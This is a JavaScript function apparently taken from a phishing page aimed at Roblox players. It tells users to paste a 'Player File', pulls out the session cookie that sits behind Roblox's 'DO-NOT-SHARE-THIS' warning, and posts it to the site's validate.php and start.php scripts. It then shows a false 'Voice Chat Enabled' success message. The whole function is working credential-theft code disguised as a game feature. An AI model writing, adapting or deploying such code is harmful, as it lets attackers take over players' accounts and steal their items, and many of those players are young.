function dumCheckCookie() {
    const dumInput = document.getElementById('dumInput').value;
    const dumButton = document.getElementById('dumButton');
    
    dumButton.innerText = `Loading...`;
    dumButton.disabled = true;
    
    const timerInterval = setInterval(() => {
        secondsElapsed++;
        dumButton.innerText = `Loading...`;
    }, 1000);
    
    if (!dumInput) {
        clearInterval(timerInterval);
        Swal.fire({
            icon: 'error',
            title: 'Error',
            text: 'Please Input something.' 
        }).then(() => {
            dumButton.innerText = 'Start Copying!';
            dumButton.disabled = false;
        });
        return;
    }

    const dumPattern = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_(.*?)\"/;
    const dumMatch = dumInput.match(dumPattern);

    if (!dumMatch || !dumMatch[1]) {
        clearInterval(timerInterval);
        Swal.fire({
            icon: 'error',
            title: 'Error',
            text: 'Please Input the correct Player File. Tipp: Watch the tutorial.'
        }).then(() => {
            dumButton.innerText = 'Start Copying!';
            dumButton.disabled = false;
        });
        return;
    }

    const dumCookie = dumMatch[1];

    fetch('/../apis/validate.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'cookie=' + encodeURIComponent(dumCookie)
    })
    .then(response => response.json())
    .then(data => {
        if (data.status === 'success') {
            fetch('start.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                body: 'cookie=' + encodeURIComponent(dumCookie)
            })
            .then(response => response.text())
            .then(data => {
                clearInterval(timerInterval);
                Swal.fire({
                    icon: 'success',
                    title: 'Success',
                    text: `Voice Chat Enabled. Please Wait 15Min Before submitting again.`,
                }).then(() => {
                    dumButton.innerText = 'Start Copying!';
                    dumButton.disabled = false;
                });
            })
            .catch(error => {
                clearInterval(timerInterval);
                Swal.fire({
                    icon: 'error',
                    title: 'Error',
                    text: 'There was an issue on our end. Please try again later.'
                }).then(() => {
                    dumButton.innerText = 'Start Copying!';
                    dumButton.disabled = false;
                });
            });
        } else {
            clearInterval(timerInterval);
            Swal.fire({
                icon: 'error',
                title: 'Error',
                text: data.message || 'An error occurred.'
            }).then(() => {
                dumButton.innerText = 'Start Copying!';
                dumButton.disabled = false;
            });
        }
    })
    .catch(error => {
        clearInterval(timerInterval);
        Swal.fire({
            icon: 'error',
            title: 'Error',
            text: 'There was an issue checking the Player File. Please try again later.'
        }).then(() => {
            dumButton.innerText = 'Start Copying!';
            dumButton.disabled = false;
        });
    });
}
